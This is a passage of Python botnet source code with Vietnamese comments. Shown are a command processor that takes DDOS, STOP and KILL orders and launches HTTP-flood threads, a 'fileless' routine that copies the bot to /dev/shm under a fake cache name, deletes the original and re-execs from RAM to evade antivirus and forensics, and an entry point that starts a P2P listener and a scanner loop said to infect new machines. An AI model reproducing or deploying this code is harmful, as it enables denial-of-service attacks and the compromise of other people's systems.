        if os.path.exists(me):
            os.remove(me)       # Xóa chính mình khỏi đĩa
    except:
        pass
    os._exit(0)     # Thoát ngay lập tức (không cleanup Python thông thường)


def stop_all_attacks():
    """Dừng tất cả các cuộc tấn công đang diễn ra.

    Cách hoạt động:
      1. Set STOP_FLAG → tất cả worker trong http_flood sẽ kiểm tra cờ và dừng
      2. Chờ tối đa 2 giây cho mỗi luồng tấn công kết thúc
      3. Xóa danh sách luồng tấn công
      4. Clear STOP_FLAG → sẵn sàng cho lệnh tấn công mới
    """
    global ATTACK_THREADS
    STOP_FLAG.set()                 # Bật cờ dừng → các worker tấn công sẽ tự thoát
    for t in ATTACK_THREADS:
        if t.is_alive():
            t.join(timeout=2)       # Chờ tối đa 2 giây
    ATTACK_THREADS = []             # Xóa danh sách
    STOP_FLAG.clear()               # Reset cờ cho lần tấn công tiếp theo


def command_processor():
    """Vòng lặp chính xử lý lệnh từ hàng đợi CMD_QUEUE.

    Đây là "bộ não" của bot - nhận lệnh và thực thi.

    Các loại lệnh hỗ trợ:
      - DDOS:   Bắt đầu tấn công HTTP flood vào mục tiêu
                 Tham số: target (IP), port, duration (giây)
      - STOP:   Dừng tất cả cuộc tấn công đang chạy
      - KILL:   Tự hủy bot (xóa file + thoát)

    Lưu ý:
      - Trước mỗi lệnh, dọn dẹp các luồng tấn công đã kết thúc
      - Khi nhận DDOS mới, dừng DDOS cũ trước (chỉ 1 cuộc tấn công tại 1 thời điểm)
    """
    global ATTACK_THREADS
    while True:
        cmd = CMD_QUEUE.get()       # Blocking: chờ cho đến khi có lệnh mới trong hàng đợi
        ct = cmd.get("type")
        print(f"[EXEC] {ct}")

        # Dọn dẹp: loại bỏ các luồng tấn công đã kết thúc khỏi danh sách
        ATTACK_THREADS = [t for t in ATTACK_THREADS if t.is_alive()]

        if ct == "DDOS":
            stop_all_attacks()      # Dừng tấn công cũ trước
            # Tạo luồng mới để tấn công HTTP flood
            t = threading.Thread(
                target=http_flood,
                args=(cmd["target"], int(cmd["port"]), int(cmd["duration"]), STOP_FLAG),
                daemon=True,
            )
            t.start()
            ATTACK_THREADS.append(t)
        elif ct == "STOP":
            stop_all_attacks()      # Dừng mọi tấn công
        elif ct == "KILL":
            cleanup_and_exit()      # Tự hủy bot


def go_fileless():
    """Kỹ thuật Fileless: Chuyển bot từ đĩa cứng sang chạy hoàn toàn trên RAM.

    Mục đích: Tránh bị phát hiện bởi anti-virus hoặc quản trị viên
    Sau khi hàm này chạy xong, bot chỉ tồn tại trong bộ nhớ (RAM),
    không có file nào trên đĩa cứng → khó bị phát hiện và khó forensic.

    Quy trình:
      1. Kiểm tra nếu đã chạy từ RAM (/dev/shm/.cache_x) → bỏ qua
      2. Kiểm tra có bot khác đang chạy không (thử bind P2P port)
         - Nếu port bị chiếm → đã có bot → thoát để tránh trùng
      3. Copy file bot hiện tại vào /dev/shm/ (hệ thống file trên RAM của Linux)
         - File được đặt tên ".cache_x" (bắt đầu bằng dấu chấm = file ẩn)
      4. Xóa file gốc trên đĩa cứng
      5. Dùng os.execv() để thay thế tiến trình hiện tại bằng bản copy trên RAM
         - execv không tạo tiến trình mới, mà "biến hình" tiến trình hiện tại
         - Sau lệnh này, code phía dưới sẽ KHÔNG được thực thi
           (tiến trình đã bị thay thế hoàn toàn)
    """
    me = os.path.abspath(sys.argv[0])       # Đường dẫn tuyệt đối của file bot đang chạy
    ram_path = "/dev/shm/.cache_x"          # Đường dẫn đích trên RAM
                                             # /dev/shm = tmpfs (hệ thống file trên RAM)
                                             # Tên ".cache_x" giả dạng file cache hệ thống

    if me == ram_path:
        return      # Đã chạy từ RAM rồi → không cần chuyển nữa

    # Kiểm tra xem có instance bot khác đang chạy trên máy này không
    # Cách kiểm tra: thử bind cổng P2P, nếu thất bại = cổng đã bị chiếm
    try:
        test_sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        test_sock.bind(("0.0.0.0", P2P_PORT))  # Thử chiếm cổng
        test_sock.close()                        # Thành công → chưa có bot nào → tiếp tục
    except OSError:
        # Cổng đã bị chiếm bởi bot khác → thoát ngay để tránh chạy trùng
        os._exit(0)

    # Copy file bot vào RAM
    try:
        import shutil
        shutil.copy2(me, ram_path)      # copy2 giữ nguyên metadata (permissions, timestamps)
        os.chmod(ram_path, 0o755)       # Cấp quyền thực thi (rwxr-xr-x)
    except:
        return      # Nếu copy thất bại → tiếp tục chạy từ vị trí hiện tại

    # Xóa file gốc trên đĩa cứng (phi tang)
    try:
        os.remove(me)
    except:
        pass    # Không xóa được cũng không sao, bot vẫn chạy từ RAM

    # Thay thế tiến trình hiện tại bằng bản copy trên RAM
    # Sau dòng này, tiến trình "biến hình" → chạy lại từ đầu nhưng từ RAM
    os.execv(ram_path, [ram_path] + sys.argv[1:])


# ====================================================================================
# ĐIỂM KHỞI CHẠY (ENTRY POINT)
# Khi chạy "python3 bot.py" hoặc "./bot", code bên dưới sẽ được thực thi
# ====================================================================================

if __name__ == "__main__":
    # Bước 1: Chuyển sang chạy từ RAM (fileless)
    # Nếu thành công, tiến trình sẽ khởi động lại từ /dev/shm/.cache_x
    # và đoạn code này sẽ chạy lại lần nữa (nhưng lần 2 go_fileless() sẽ return ngay)
    go_fileless()

    # Bước 2: In thông tin khởi động
    print(f"--- BOT {BOT_ID} ---")              # ID duy nhất của bot
    print(f"    P2P: :{P2P_PORT}")              # Cổng P2P đang lắng nghe
    print(f"    Peers: {len(BOOTSTRAP_PEERS)}")  # Số peer khởi tạo
    print(f"-------------------")

    # Bước 3: Khởi động các dịch vụ nền
    # Luồng 1: P2P listener - lắng nghe và xử lý tin nhắn UDP từ các peer
    threading.Thread(target=p2p_listener, args=(CMD_QUEUE, CMD_REF), daemon=True).start()
    # Luồng 2: Scanner - liên tục quét và lây nhiễm máy mới
    threading.Thread(target=scanner_loop, daemon=True).start()

    # Bước 4: Chạy command_processor ở luồng chính (blocking)
    # Luồng chính sẽ ở đây mãi mãi, chờ và xử lý lệnh từ CMD_QUEUE
    # Nếu luồng chính thoát → tất cả daemon threads cũng tự chết
    command_processor()
